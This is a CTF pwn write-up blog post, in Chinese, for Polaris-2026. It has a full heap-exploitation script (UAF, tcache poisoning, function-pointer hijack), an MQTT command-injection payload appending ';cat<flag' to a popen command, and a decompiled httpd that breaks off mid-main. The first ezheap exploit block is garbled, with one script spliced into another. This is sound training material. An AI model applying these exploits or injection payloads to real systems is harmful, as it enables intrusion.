---
title: Polaris-2026-pwn 题解
date: 2026-04-22 18:04:00
tags: 
    - pwn
    - Polaris2026
    - WriteUp
categories: Contest
---
## ez-nc

### 攻击思路

盲打，发现有格式化字符串漏洞，提示下载 ez-nc ，但是单文件名上限为 7 ，且禁止明文出现 "ez-nc"。
因此考虑利用栈上的环境变量来下载 ez-nc 。

### exp

输入 `%99$s` 后把文件 dump 下来反编译即可发现明文 flag

## ezheap

ez 在哪了，，，

### checksec

```
[*] '/home/RatherHard/CTF-pwn/PolarisCTF/ezheap/inference_forge'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

### IDA

去符号化，还是 C++ 逆向，，，还要还原结构体，，，

难点全在逆向上了

逆向结果：

```c
#include <iostream>
#include <cstring>

#define __int64 long long
#define uint32_t unsigned int
#define uint64_t unsigned long long
#define uint8_t unsigned char

struct session_handle // sizeof=0x50
{
  uint32_t slot_id;
  uint32_t payload_size;
  char *payload;
  char alias[32];
  uint64_t generation;
  void (*postproc)(session_handle *);
  uint64_t pad[2];
};

struct scheduler_ctrl // sizeof=0x48
{
  uint64_t magic_iforge;
  union {
    struct {
      uint8_t strict_policy;
      uint8_t healthy;
    };
    uint64_t task_list[8];
  };
};

struct task_descriptor // sizeof=0x50
{
  uint64_t task_id;
  uint64_t arg0;
  uint64_t pad10;
  void *handler; // alias[8:16]
  void *ctx;
  char tag[0x28];
};

struct worker_profile // sizeof=0x50
{
  uint64_t cpu_quota;
  uint64_t mem_quota;
  uint64_t io_weight;
  uint64_t latency_slo;
  uint64_t replicas;
  char memo[32];
  uint64_t region_code;
};

struct runtime_state // sizeof=0x190
{
  uint32_t artifact_items;
  uint32_t artifact_stride;
  uint32_t artifact_alloc_bytes;
  uint32_t pad;
  uint64_t artifact_declared_bytes;
  void *artifact_arena;
  scheduler_ctrl *scheduler;
  task_descriptor *task_desc[8];
  session_handle *sessions[16];
  uint64_t session_generation[16];
  uint8_t session_active[16];
  worker_profile **worker_profiles_begin;
  worker_profile **worker_profiles_end;
  worker_profile **worker_profiles_cap;
  worker_profile **worker_profiles_cap;
};

void session_postproc_xor_stride();
void audit_flag_snapshot();
void session_postproc_clamp_negative_bytes();
void session_postproc_shift_right();
void task_handler_echo_descriptor();
void task_handler_mul3();
void task_handler_xor_cookie();
void worker_vector_realloc_insert(worker_profile **begin, worker_profile **end, worker_profile *new_element);


// 3
__int64 bootstrap_scheduler(runtime_state *state)
{
  if ( state->scheduler )
  {
    std::cout << "scheduler already bootstrapped" << std::endl;
    return 0;
  }
  state->scheduler = (scheduler_ctrl *)malloc(0x38u);
  if ( state->scheduler )
  {
    state->scheduler->magic_iforge = 'IFORGE';
    *(_OWORD *)(v10 + 26) = 0;
    *((_WORD *)v10 + 4) = 257;
    *(_OWORD *)(v10 + 10) = 0;
    *(_OWORD *)(v10 + 40) = 0;
    int i = 0;
    while ( 1 )
    {
      task_descriptor *task_desc = (task_descriptor *)malloc(0x50u);
      if ( !task_desc )
        break;
      void *func;
      if ( i % 3 == 0 )
        func = task_handler_echo_descriptor;
      if ( i % 3 == 1 )
        func = task_handler_xor_cookie;
      if ( i % 3 == 2 )
        func = task_handler_mul3;
      task_desc->handler = func;
      task_desc->task_id = i;
      task_desc->arg0 = i + 1;
      task_desc->ctx = task_desc;
      snprintf(task_desc->tag, 32, "sqe-%zu", i);
      state->task_desc[i] = task_desc;
      *((_QWORD *)&state->scheduler + v17) = v16;
      if ( i == 7 )
      {
        std::cout << "scheduler bootstrap complete, strict_policy=on" << std::endl;
        return 0;
      }
      ++i;
    }
    std::cout << "task descriptor allocation failed" << std::endl;
  }
}

// 4
unsigned __int64 inspect_scheduler_queue(runtime_state *state)
{
  if ( state->scheduler )
  {
    std::cout << "queue_ctrl=" << &state->scheduler 
      << " strict_policy=" << state->scheduler->strict_policy 
      << " healthy=" << state->scheduler->healthy << std::endl;
    for ( int i = 0; i != 8; ++i )
    {
      std::cout << "[task " << i << "] desc=" << &state->task_desc[i] 
        << " handler=" << &state->task_desc[i]->handler 
        << " ctx=" << &state->task_desc[i]->ctx 
        << " tag='" << state->task_desc[i]->tag << "'" << std::endl;
    }
  }
  else
  {
    std::cout << "scheduler offline" << std::endl;
  }
  return 0;
}

// 5
unsigned __int64 allocate_session_tensor(runtime_state *state)
{
  int slot, tensor_bytes, alias;
  std::cout << "session.slot(0-15)> ";
  std::cin >> slot;
  std::cout << "session.tensor_bytes> ";
  std::cin >> tensor_bytes;
  std::cout << "session.alias> ";
  std::cin >> alias;
  if ( (unsigned int)slot <= 0xF )
  {
    session_handle *session = (session_handle *)malloc(0x50u);
    session->slot_id = slot;
    session->payload_size = tensor_bytes;
    session->payload = (char *)malloc(tensor_bytes);
    if ( session->payload )
    {
      memset((void *)session->payload, 65, tensor_bytes);
      snprintf(session->alias, 32, "%s", (const char *)alias);
      v16 = (char *)state + 8 * slot;
      v17 = *((_QWORD *)v16 + 29);
      *((_QWORD *)v16 + 13) = session;
      *((_QWORD *)v16 + 29) = ++v17;
      session->generation = v17;
      session->postproc = (void (*)(session_handle *))session_postproc_xor_stride;
      state->session_active[slot] = 1;
      std::cout << "session tensor ready slot=" << slot
        << " handle=" << &session 
        << " payload=" << &session->payload 
        << " postproc=" << &session->postproc << std::endl;
    }
    else
    {
      std::cout << "session tensor allocation failed" << std::endl;
    }
  }
  else
    std::cout << "session tensor request invalid" << std::endl;
  return 0;
}

// 6
unsigned __int64 complete_batch_inference(runtime_state *state)
{
  __int64 slot;

  std::cout << "ssession.slot> ";
  std::cin >> slot;

  if ( (unsigned int)slot > 0xF )
  {
    std::cout << "session slot invalid" << std::endl;
    return 0;
  }
  if ( !state->session_active[slot] )
  {
    std::cout << "session slot not active" << std::endl;
    return 0;
  }
  if ( !state->sessions[slot] )
  {
    std::cout << "session slot empty" << std::endl;
    return 0;
  }

  if ( state->sessions[slot]->payload )
  {
    if ( state->sessions[slot]->payload_size >= 2 )
      for ( int i = 1; i <= state->sessions[slot]->payload_size; i++)
        state->sessions[slot]->payload[i] ^= (13 * i);
    free(state->sessions[slot]->payload);
  }

  if ( (void (*)())state->sessions[slot]->postproc != session_postproc_clamp_negative_bytes
    && (void (*)())state->sessions[slot]->postproc != session_postproc_xor_stride
    && (void (*)())state->sessions[slot]->postproc != session_postproc_shift_right
    && state->sessions[slot]->postproc )
  {
    std::cout << "postproc profile invalid, fallback to default pipeline" << std::endl;
    state->sessions[slot]->postproc = (void (*)(session_handle *))session_postproc_xor_stride;
  }
  if ( state->sessions[slot]->postproc )
    state->sessions[slot]->postproc(state->sessions[slot]);

  operator delete(state->sessions[slot], 0x50u);
  state->session_active[slot] = 0;
  std::cout << "batch inference finalized, session recycled" << std::endl;
  return 0;
}

// 7
unsigned __int64 patch_session_metadata(runtime_state *state)
{
  int slot, qword_index, qword_value;
  std::cout << "diag.session.slot> ";
  std::cin >> slot;
  std::cout << "diag.qword_index> ";
  std::cin >> qword_index;
  std::cout << "diag.qword_value(u64)> ";
  std::cin >> qword_value;
  
  if ( slot <= 0xFu )
  {
    if ( !state->sessions[slot] )
    {
      std::cout << "session handle missing" << std::endl;
      return 0;
    }
    if ( state->session_active[slot] )
      std::cout << "diagnostic patch requires recycled session context" << std::endl;
    else
    {
      if ( !qword_index )
      {
        state->sessions[slot]->slot_id = qword_value;   // tcache poisoning
        std::cout << "diagnostic patch applied at " << &state->sessions[slot] << std::endl;
        return 0;
      }
      std::cout << "diagnostic offset policy allows qword_index=0 only" << std::endl;
    }
  }
  else
    std::cout << "diagnostic patch args invalid" << std::endl;
  return 0;
}

// 8
unsigned __int64 provision_worker_profile(runtime_state *state)
{
  if ( (char *)state->worker_profiles_end - (char *)state->worker_profiles_begin <= 0x1f8 )
  {
    worker_profile *worker = (worker_profile *)malloc(0x50u);
    std::cout << "worker.cpu_quota> ";
    std::cin >> worker->cpu_quota;
    std::cout << "worker.mem_quota> ";
    std::cin >> worker->mem_quota;
    std::cout << "worker.io_weight> ";
    std::cin >> worker->io_weight;
    std::cout << "worker.latency_slo> ";
    std::cin >> worker->latency_slo;
    std::cout << "worker.replicas> ";
    std::cin >> worker->replicas;
    std::cout << "worker.region_code> ";
    std::cin >> worker->region_code;
    std::cout << "worker.memo> ";
    std::cin >> worker->memo;
    snprintf(worker->memo, 0x20u, "%s", worker->memo);
    if ( state->worker_profiles_end == state->worker_profiles_cap )
    {
      worker_vector_realloc_insert(state->worker_profiles_begin, state->worker_profiles_end, worker);
    }
    else
    {
      *state->worker_profiles_end = (worker_profile *)worker;
      state->worker_profiles_end = state->worker_profiles_end + 1;
    }
    std::cout << "worker profile provisioned handle=" << &worker 
      << " index=" << state->worker_profiles_end - state->worker_profiles_begin - 1 << std::endl;
    return 0;
  }
  std::cout << "autoscaler capacity reached" << std::endl;
  return 0;
}

// 9
unsigned __int64 dispatch_async_task(runtime_state *state)
{
  int task_id;
  
  if ( state->scheduler )
  {
    std::cout << "queue.task_id> ";
    std::cin >> task_id;
    if ( (unsigned int)task_id <= 7 )
    {
      if ( state->task_desc[task_id] && state->task_desc[task_id]->handler)
      {
        if ( state->task_desc[task_id]->handler == task_handler_xor_cookie
          || state->task_desc[task_id]->handler == task_handler_echo_descriptor
          || state->scheduler->strict_policy == 0
          || state->task_desc[task_id]->handler == task_handler_mul3 )
        {
          ((void (*)(void *))state->task_desc[task_id]->handler)(state->task_desc[task_id]->ctx);
          return 0;
        }
        std::cout << "policy engine blocked non-whitelisted handler" << std::endl;
      }
      else
      {
        std::cout << "task descriptor unavailable" << std::endl;
      }
    }
    else
    {
      std::cout << "task id invalid" << std::endl;
    }
    return 0;
  }
  std::cout << "scheduler offline" << std::endl;
  return 0;
}
```

好复杂的菜单题，，，

### 攻击思路

bootstrap_scheduler 用于初始化堆结构

inspect_scheduler_queue 把需要 leak 的数据送到嘴边

complete_batch_inference 函数有明显的 UAF 漏洞，对象为 `state->sessions[slot]`

patch_session_metadata 为 UAF 和 tcache poisoning 创造了极为有利的条件，可以说是刻意设计的

provision_worker_profile 允许通过结构体重叠写入较多的数据

dispatch_async_task 有函数指针的执行，注意到程序中已经有针对 flag 的读取行为，所以可以利用 provision_worker_profile 劫持该函数指针去跳转

劫持函数指针之前需要将 strict_policy 设置为 0 ，而 provision_worker_profile 也可以做到这一点

综上分析，直接打 tcache poisoning 即可

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './pwn_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')

libcoffsetdict = dict()
libcrealdict = dict()

def libcdict_add(name, addr):
    if addr > 0x1000000:
        libcrealdict[name] = addr
        addr %= 0x1000
    libcoffsetdict[name] = addr

def getlibc():
    global libc
    if not debug:
        libc = ELF(libcdb.search_by_symbol_offsets(libcoffsetdict))

def initlibc():
    if not debug:
        subprocess.run(['cp', libc.path, './libc.so.6'])
        subprocess.run(['pwninit', '--no-template'])

target = '60.205.163.215'from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './inference_forge_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')

target = '60.205.163.215'
port = 13774

if debug:
    p = process(file)
else:
    p = remote(target, port)

io = p

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))

def safe_linking(pos, val):
    return (pos >> 12) ^ val

def bootstrap_scheduler():
    sla(b'gateway> ', b'3')

def inspect_scheduler_queue():
    sla(b'gateway> ', b'4')

def allocate_session_tensor(slot, tensor_bytes, alias):
    sla(b'gateway> ', b'5')
    sla(b'session.slot(0-15)> ', str(slot).encode())
    sla(b'session.tensor_bytes> ', str(tensor_bytes).encode())
    sla(b'session.alias> ', alias)

def complete_batch_inference(slot):
    sla(b'gateway> ', b'6')
    sla(b'session.slot> ', str(slot).encode())

def patch_session_metadata(slot, qword_index, qword_value):
    sla(b'gateway> ', b'7')
    sla(b'diag.session.slot> ', str(slot).encode())
    sla(b'diag.qword_index> ', str(qword_index).encode())
    sla(b'diag.qword_value(u64)> ', str(qword_value).encode())

def provision_worker_profile(cpu_quota, mem_quota, io_weight, latency_slo, replicas, region_code, memo):
    sla(b'gateway> ', b'8')
    sla(b'worker.cpu_quota> ', str(cpu_quota).encode())
    sla(b'worker.mem_quota> ', str(mem_quota).encode())
    sla(b'worker.io_weight> ', str(io_weight).encode())
    sla(b'worker.latency_slo> ', str(latency_slo).encode())
    sla(b'worker.replicas> ', str(replicas).encode())
    sla(b'worker.region_code> ', str(region_code).encode())
    sla(b'worker.memo> ', memo)

def dispatch_async_task(task_id):
    sla(b'gateway> ', b'9')
    sla(b'queue.task_id> ', str(task_id).encode())

bootstrap_scheduler()       # leak
inspect_scheduler_queue()
ru(b'[task:0] desc=')
heap_leak = int(r(14), 16) - 0x30560
leak('heap_leak')
ru(b'handler=')
pie_leak = int(r(14), 16) - 0x30a0
leak('pie_leak')

allocate_session_tensor(0, 3, p64(0))       # init
allocate_session_tensor(1, 3, p64(0))
allocate_session_tensor(2, 3, p64(0))
allocate_session_tensor(3, 3, p64(0))
allocate_session_tensor(4, 3, p64(0))
complete_batch_inference(1)
complete_batch_inference(2)
complete_batch_inference(3)
complete_batch_inference(4)

complete_batch_inference(0)     # tcache poisoning, hijack strict_policy
patch_session_metadata(0, 0, safe_linking(heap_leak + 0x30860, heap_leak + 0xb0))
allocate_session_tensor(0, 3, p64(0))
provision_worker_profile(heap_leak + 0x30510, 0, 0, 0, 0, 0, p64(0))
provision_worker_profile(0, 0, 0, 0, 0, 0, p64(0))
inspect_scheduler_queue()

complete_batch_inference(0)     # tcache poisoning, hijack handler
patch_session_metadata(0, 0, safe_linking(heap_leak + 0x30860, heap_leak + 0xb0))
allocate_session_tensor(0, 3, p64(0))
provision_worker_profile(heap_leak + 0x30560, 0, 0, 0, 0, 0, p64(0))
provision_worker_profile(0, 0, 0, pie_leak + 0x6750, 0, 0, p64(0))
inspect_scheduler_queue()

dispatch_async_task(0)
itr()
```

## mini-mqtt

第一次写 mqtt 的题目

### IDA

#### main

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  const char *mqtt_ip; // rax
  const char *v5; // [rsp+18h] [rbp-8h]

  if ( argc <= 1 )
    mqtt_ip = "tcp://localhost:9999";
  else
    mqtt_ip = argv[1];
  v5 = mqtt_ip;
  printf("Using server at %s\n", mqtt_ip);
  rc = MQTTClient_create(&client, v5, "httpclient", 1, 0);
  if ( rc )
  {
    printf("Failed to create client, return code %d\n", rc);
    rc = 1;
  }
  else
  {
    rc = MQTTClient_setCallbacks(client, 0, connlost, msgarrvd, delivered);
    if ( rc )
    {
      printf("Failed to set callbacks, return code %d\n", rc);
      rc = 1;
    }
    else
    {
      dword_5028 = 20;
      dword_502C = 1;
      rc = MQTTClient_connect(client, conn_opts);
      if ( !rc )
      {
        MQTTClient_subscribe(client, "HTTP", 1);
        while ( 1 )
        {
          sleep(1u);
          msgsend("200");
          puts("waiting for message\n");
        }
      }
      printf("Failed to connect, return code %d\n", rc);
      rc = 1;
    }
    MQTTClient_destroy(&client);
  }
  return rc;
}
```

这是一个客户端程序，服务端呢？自己搭。

该客户端订阅了 "HTTP" topic

核心在 `rc = MQTTClient_setCallbacks(client, 0, connlost, msgarrvd, delivered);`

其中 msgarrvd 函数是客户端收到 topic 后的响应

#### msgarrvd

```c
__int64 __fastcall msgarrvd(__int64 a1, const char *a2, int a3, __int64 a4)
{
  __int64 v5; // [rsp+0h] [rbp-80h] BYREF
  int v6; // [rsp+Ch] [rbp-74h]
  const char *v7; // [rsp+10h] [rbp-70h]
  __int64 v8; // [rsp+18h] [rbp-68h]
  __int64 v9; // [rsp+28h] [rbp-58h]
  char s1[72]; // [rsp+30h] [rbp-50h] BYREF
  unsigned __int64 v11; // [rsp+78h] [rbp-8h]

  v8 = a1;
  v7 = a2;
  v6 = a3;
  v5 = a4;
  v11 = __readfsqword(0x28u);
  v9 = *(_QWORD *)(a4 + 16);
  if ( (unsigned int)__isoc99_sscanf(v9, "{\"clientid\":\"%63[^\"]\",", s1) == 1 && !strcmp(s1, "httpclient") )// {"clientid":"hacker"}
  {
    MQTTClient_freeMessage(&v5);
    MQTTClient_free(v7);
    return 1;
  }
  else
  {
    http(v9);
    puts("Message arrived");
    printf("     topic: %s\n", v7);
    printf("   message: %.*s\n", *(_DWORD *)(v5 + 8), *(const char **)(v5 + 16));
    MQTTClient_freeMessage(&v5);
    MQTTClient_free(v7);
    return 1;
  }
}
```

由此可见，这道题目需要我们去构造恶意 topic 信息，让客户端在解析信息的过程中回弹 flag 的内容

这里还要求 clientid 不为 httpclient ，因为这是他自身的 id

然后就套了一层 http 的解析

#### http

```c
__int64 __fastcall http(const char *a1)
{
  size_t v2; // rax
  size_t v3; // rbx
  int v4; // [rsp+10h] [rbp-280h] BYREF
  int v5; // [rsp+14h] [rbp-27Ch]
  int i; // [rsp+18h] [rbp-278h]
  int v7; // [rsp+1Ch] [rbp-274h]
  FILE *stream; // [rsp+20h] [rbp-270h]
  char *v9; // [rsp+28h] [rbp-268h]
  char s1[8]; // [rsp+30h] [rbp-260h] BYREF
  __int64 v11; // [rsp+38h] [rbp-258h]
  __int64 v12; // [rsp+40h] [rbp-250h]
  __int64 v13; // [rsp+48h] [rbp-248h]
  __int64 v14; // [rsp+50h] [rbp-240h]
  __int64 v15; // [rsp+58h] [rbp-238h]
  __int64 v16; // [rsp+60h] [rbp-230h]
  __int64 v17; // [rsp+68h] [rbp-228h]
  char s[8]; // [rsp+70h] [rbp-220h] BYREF
  __int64 v19; // [rsp+78h] [rbp-218h]
  __int64 v20; // [rsp+80h] [rbp-210h]
  __int64 v21; // [rsp+88h] [rbp-208h]
  __int64 v22; // [rsp+90h] [rbp-200h]
  __int64 v23; // [rsp+98h] [rbp-1F8h]
  __int64 v24; // [rsp+A0h] [rbp-1F0h]
  __int64 v25; // [rsp+A8h] [rbp-1E8h]
  __int64 v26; // [rsp+B0h] [rbp-1E0h]
  __int64 v27; // [rsp+B8h] [rbp-1D8h]
  __int64 v28; // [rsp+C0h] [rbp-1D0h]
  __int64 v29; // [rsp+C8h] [rbp-1C8h]
  __int64 v30; // [rsp+D0h] [rbp-1C0h]
  __int64 v31; // [rsp+D8h] [rbp-1B8h]
  __int64 v32; // [rsp+E0h] [rbp-1B0h]
  __int64 v33; // [rsp+E8h] [rbp-1A8h]
  char src[8]; // [rsp+F0h] [rbp-1A0h] BYREF
  __int64 v35; // [rsp+F8h] [rbp-198h]
  __int64 v36; // [rsp+100h] [rbp-190h]
  __int64 v37; // [rsp+108h] [rbp-188h]
  __int64 v38; // [rsp+110h] [rbp-180h]
  __int64 v39; // [rsp+118h] [rbp-178h]
  __int64 v40; // [rsp+120h] [rbp-170h]
  __int64 v41; // [rsp+128h] [rbp-168h]
  __int64 v42; // [rsp+130h] [rbp-160h]
  __int64 v43; // [rsp+138h] [rbp-158h]
  __int64 v44; // [rsp+140h] [rbp-150h]
  __int64 v45; // [rsp+148h] [rbp-148h]
  __int64 v46; // [rsp+150h] [rbp-140h]
  __int64 v47; // [rsp+158h] [rbp-138h]
  __int64 v48; // [rsp+160h] [rbp-130h]
  __int64 v49; // [rsp+168h] [rbp-128h]
  char v50[8]; // [rsp+170h] [rbp-120h] BYREF
  __int64 v51; // [rsp+178h] [rbp-118h]
  __int64 v52; // [rsp+180h] [rbp-110h]
  __int64 v53; // [rsp+188h] [rbp-108h]
  __int64 v54; // [rsp+190h] [rbp-100h]
  __int64 v55; // [rsp+198h] [rbp-F8h]
  __int64 v56; // [rsp+1A0h] [rbp-F0h]
  __int64 v57; // [rsp+1A8h] [rbp-E8h]
  __int64 v58; // [rsp+1B0h] [rbp-E0h]
  __int64 v59; // [rsp+1B8h] [rbp-D8h]
  __int64 v60; // [rsp+1C0h] [rbp-D0h]
  __int64 v61; // [rsp+1C8h] [rbp-C8h]
  __int64 v62; // [rsp+1D0h] [rbp-C0h]
  __int64 v63; // [rsp+1D8h] [rbp-B8h]
  __int64 v64; // [rsp+1E0h] [rbp-B0h]
  __int64 v65; // [rsp+1E8h] [rbp-A8h]
  __int64 v66; // [rsp+1F0h] [rbp-A0h]
  __int64 v67; // [rsp+1F8h] [rbp-98h]
  __int64 v68; // [rsp+200h] [rbp-90h]
  __int64 v69; // [rsp+208h] [rbp-88h]
  __int64 v70; // [rsp+210h] [rbp-80h]
  __int64 v71; // [rsp+218h] [rbp-78h]
  __int64 v72; // [rsp+220h] [rbp-70h]
  __int64 v73; // [rsp+228h] [rbp-68h]
  __int64 v74; // [rsp+230h] [rbp-60h]
  __int64 v75; // [rsp+238h] [rbp-58h]
  __int64 v76; // [rsp+240h] [rbp-50h]
  __int64 v77; // [rsp+248h] [rbp-48h]
  __int64 v78; // [rsp+250h] [rbp-40h]
  __int64 v79; // [rsp+258h] [rbp-38h]
  __int64 v80; // [rsp+260h] [rbp-30h]
  __int64 v81; // [rsp+268h] [rbp-28h]
  unsigned __int64 v82; // [rsp+278h] [rbp-18h]

  v82 = __readfsqword(0x28u);
  *(_QWORD *)s1 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  *(_QWORD *)s = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  *(_QWORD *)src = 0;
  v35 = 0;
  v36 = 0;
  v37 = 0;
  v38 = 0;
  v39 = 0;
  v40 = 0;
  v41 = 0;
  v42 = 0;
  v43 = 0;
  v44 = 0;
  v45 = 0;
  v46 = 0;
  v47 = 0;
  v48 = 0;
  v49 = 0;
  v26 = 0;
  v27 = 0;
  v28 = 0;
  v29 = 0;
  v30 = 0;
  v31 = 0;
  v32 = 0;
  v33 = 0;
  v5 = 0;
  v7 = 0;
  stream = 0;
  *(_QWORD *)v50 = 0;
  v51 = 0;
  v52 = 0;
  v53 = 0;
  v54 = 0;
  v55 = 0;
  v56 = 0;
  v57 = 0;
  v58 = 0;
  v59 = 0;
  v60 = 0;
  v61 = 0;
  v62 = 0;
  v63 = 0;
  v64 = 0;
  v65 = 0;
  v66 = 0;
  v67 = 0;
  v68 = 0;
  v69 = 0;
  v70 = 0;
  v71 = 0;
  v72 = 0;
  v73 = 0;
  v74 = 0;
  v75 = 0;
  v76 = 0;
  v77 = 0;
  v78 = 0;
  v79 = 0;
  v80 = 0;
  v81 = 0;
  v4 = 0;
  if ( (unsigned int)__isoc99_sscanf(a1, "{\"clientid\":\"%63[^\"]\"", s1) == 1 && !strcmp(s1, "httpclient") )// no httpclient
    return 1;
  if ( (unsigned int)__isoc99_sscanf(a1, "GET /home/ctf/%63[^ \"\r\n/]", s) == 1 )
  {
    v5 = 1;
  }
  else if ( (unsigned int)__isoc99_sscanf(a1, "GET %*[^/]/ctf/%63[^ \"\r\n/]", s) == 1 )
  {
    v5 = 1;
  }
  else if ( (unsigned int)__isoc99_sscanf(a1, "GET %*s/ctf/\"%63[^\"]\"", s) == 1 )
  {
    v5 = 1;
  }
  else if ( strstr(a1, "/ctf/") )
  {
    v9 = strstr(a1, "/ctf/") + 5;
    __isoc99_sscanf(v9, "%63[^ \"\r\n/]", s);
    v5 = 1;
  }
  if ( v5 )
  {
    if ( (unsigned int)__isoc99_sscanf(a1, "GET %*s HTTP/1.1\r\nHost: %*s\r\nContentLength: %d\r\n", &v4) == 1 )
    {
      printf("find length: %d\n", v4);
      v2 = strlen(s);
      if ( v2 > v4 )
      {
        puts("file name length exceeds contentlength");
        return 0;
      }
      if ( v4 > 10 )
      {
        puts("contentlength too long");
        return 0;
      }
    }
    else
    {
      puts("ContentLength not found");
      v5 = 0;
    }
    for ( i = 0; ; ++i )
    {
      v3 = i;
      if ( v3 >= strlen(s) )
        break;
      if ( s[i] == '/' || s[i] == '.' )
        s[i] = '_';
    }
    snprintf(src, 0x80u, "cat /home/ctf/%s", s);
    v7 = strlen(src);
    memcpy(cmd, src, v7);
    if ( !strcmp(s, "index_html") )             // is index_html
    {
      if ( v5 )
        stream = popen(cmd, "r");
      if ( stream )
      {
        while ( fgets(v50, 255, stream) )
        {
          v50[strcspn(v50, "\n")] = 0;
          if ( v50[0] )
          {
            msgsend(v50);
            memset(v50, 0, 0x100u);
          }
        }
        pclose(stream);
      }
      else
      {
        msgsend("403");
      }
      return 1;
    }
    else
    {
      puts("fault2");
      return 0;
    }
  }
  else
  {
    puts("fault");
    puts("404");
    return 0;
  }
}
```

协议的格式就是正常 http 协议的格式

注意这一段：

```c
    for ( i = 0; ; ++i )
    {
      v3 = i;
      if ( v3 >= strlen(s) )
        break;
      if ( s[i] == '/' || s[i] == '.' )
        s[i] = '_';
    }
    snprintf(src, 0x80u, "cat /home/ctf/%s", s);
    v7 = strlen(src);
    memcpy(cmd, src, v7);
    if ( !strcmp(s, "index_html") )             // is index_html
    {
      if ( v5 )
        stream = popen(cmd, "r");
```

src 中只能是 index_html 的格式，但发现校验的对象是 src ，而被执行的是 cmd ，且 cmd 在校验前已经赋值好，在校验失败后会残留，所以我们可以利用 shell 中 ';' 的作用完成漏洞的利用

### 攻击思路

第一次发送 `GET /home/ctf/index_html;cat<flag` ， cmd 变为 `cat /home/ctf/index_html;cat<flag` ，校验不通过

第二次发送 `GET /home/ctf/index_html` ， 前段被覆盖后 cmd 还是 `cat /home/ctf/index_html;cat<flag` ，且校验通过， popen 执行 `cat /home/ctf/index_html;cat<flag` ，成功获取到 flag

### exp

```python
from pwn import *
import threading

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

file = './pwn'
elf = ELF(file)
libc = ELF('./libc.so.6')
target = 'nc1.ctfplus.cn'
port = 41317


def encode_varint(n):
    res = b""
    while n > 0:
        byte = n & 0x7f
        n >>= 7
        if n > 0:
            byte |= 0x80
        res += bytes([byte])
    return res

def mqtt_connect(client_id=b"hacker"):
    payload = b"\x00\x04MQTT\x04\x02\x00\x3c" + struct.pack(">H", len(client_id)) + client_id
    return b"\x10" + encode_varint(len(payload)) + payload

def mqtt_publish(topic, msg, retain=True):
    flags = 0x31 if retain else 0x30
    payload = struct.pack(">H", len(topic)) + topic + msg
    return bytes([flags]) + encode_varint(len(payload)) + payload

def mqtt_subscribe(topic, pkt_id=1):
    payload = struct.pack(">H", pkt_id) + struct.pack(">H", len(topic)) + topic + b"\x00"
    return b"\x82" + encode_varint(len(payload)) + payload


if debug:
    p = remote('127.0.0.1', 9998)
else:
    p = remote(target, port)

io = p

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

def peek(num=4096):
    message = p.recv(num)
    p.unrecv(message)
    return message

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
ur      = lambda x              :p.unrecv(x)
pk      = lambda num=4096       :peek(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success('{} = {}'.format(name, hex(eval(name))))

def attack():
    s(mqtt_connect())
    s(mqtt_subscribe(b'HTTP'))
    payload = b'GET /home/ctf/index_html;cat<flag'
    s(mqtt_publish(b'HTTP', payload))
    payload = b'GET /home/ctf/index_html HTTP/1.1\r\nHost: x\r\nContentLength: 10\r\n'
    s(mqtt_publish(b'HTTP', payload))
    itr()

attack()
```

## httpd

第一次做 httpd

还是难在逆向，，，

### checksec

```
[*] '/home/RatherHard/CTF-pwn/PolarisCTF/httpd/httpd'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
```

好久没见过 no pie 的题目了

### IDA

#### main

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int optval; // [rsp+Ch] [rbp-D4h] BYREF
  socklen_t addr_len; // [rsp+10h] [rbp-D0h] BYREF
  int fd; // [rsp+14h] [rbp-CCh]
  int v6; // [rsp+18h] [rbp-C8h]
  __pid_t v7; // [rsp+1Ch] [rbp-C4h]
  sockaddr addr; // [rsp+20h] [rbp-C0h] BYREF
  struct sockaddr v9; // [rsp+30h] [rbp-B0h] BYREF
  sigaction act; // [rsp+40h] [rbp-A0h] BYREF
  unsigned __int64 v11; // [rsp+D8h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  optval = 1;
  fd = socket(2, 1, 0);
  if ( !fd )
  {
    perror("Socket failed");
    exit(1);
  }
  setsockopt(fd, 1, 2, &optval, 4u);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
